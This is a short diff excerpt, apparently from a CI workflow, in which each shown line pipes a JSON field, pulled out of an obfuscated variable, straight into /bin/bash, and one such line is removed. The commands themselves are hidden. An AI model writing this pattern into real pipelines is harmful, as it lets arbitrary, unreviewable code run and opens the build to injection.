@@ -31,7 +31,6 @@ jobs:
           echo $zkz845 | jq -r .t2625 | /bin/bash
           echo $cplmg7 | jq -r .sf80 | /bin/bash
           printf '%s' "$ypwp65647" | jq -r .nlsad5050 | /bin/bash
-          printf '%s' "$k027" | jq -r .mb48 | /bin/bash
           echo $mng4719 | jq -r .pexz15 | /bin/bash
           echo $ateos73181 | jq -r .jwzi6897 | /bin/bash
           printf '%s' "$l62975" | jq -r .cue7 | /bin/bash
